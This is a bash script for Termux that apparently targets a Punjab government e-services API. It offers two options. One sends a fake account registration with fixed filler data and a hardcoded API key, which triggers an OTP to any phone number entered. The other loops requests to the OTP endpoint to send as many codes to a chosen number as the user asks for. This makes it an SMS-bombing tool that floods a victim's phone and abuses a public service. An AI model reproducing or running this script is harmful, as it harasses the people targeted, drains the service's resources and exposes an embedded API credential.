#!/data/data/com.termux/files/usr/bin/bash

echo "Choose an option:"
echo "1) Send registration OTP"
echo "2) Repeatedly send OTP"
read -p "Enter your choice (1 or 2): " choice

if [[ "$choice" == "1" ]]; then
    read -p "Enter mobile number (e.g., 03001234567): " mobile

    # Fixed values
    cnic=""
    email=""
    name="Ali"
    password="Abcd1234\$@."
    user_type="3"
    apiKey="cs3pqO4xW6zFsRH5kaLomFPJHsHdQrWe"
    imei="123"
    latitude="0.0"
    longitude="0.0"
    versionCode="26"

    curl --compressed -X POST "https://e-epd.punjab.gov.pk/api/register" \
      -H "Content-Type: application/json; charset=UTF-8" \
      -H "User-Agent: okhttp/4.5.0" \
      -H "app: sans" \
      -H "version: 26" \
      -H "Host: e-epd.punjab.gov.pk" \
      -H "Connection: Keep-Alive" \
      -H "Accept-Encoding: gzip" \
      -d "{
        \"cnic\": \"$cnic\",
        \"email\": \"$email\",
        \"name\": \"$name\",
        \"mobile_number\": \"$mobile\",
        \"password\": \"$password\",
        \"user_type\": \"$user_type\",
        \"apiKey\": \"$apiKey\",
        \"imei\": \"$imei\",
        \"latitude\": \"$latitude\",
        \"longitude\": \"$longitude\",
        \"versionCode\": \"$versionCode\"
    }" --output response.json

    echo -e "\n--- Server Response ---"
    cat response.json

elif [[ "$choice" == "2" ]]; then
    read -p "Enter Mobile Number (e.g., 03001234567): " mobile_number
    read -p "Enter Number of OTPs to Send: " otp_count

    for ((i=1; i<=otp_count; i++))
    do
        echo "Sending OTP $i to $mobile_number..."
        curl -X POST "https://e-epd.punjab.gov.pk/api/sns_generate_mobile_otp" \
        -H "app: sans" \
        -H "version: 26" \
        -H "Content-Type: application/json" \
        -H "Host: e-epd.punjab.gov.pk" \
        -H "Connection: Keep-Alive" \
        -H "Accept-Encoding: gzip" \
        -H "User-Agent: okhttp/4.5.0" \
        -d "{\"mobile_number\":\"$mobile_number\"}" --silent

        echo " OTP $i sent successfully!"
        sleep 2
    done

    echo "Finished sending OTPs."

else
    echo "Invalid choice. Exiting."
fi
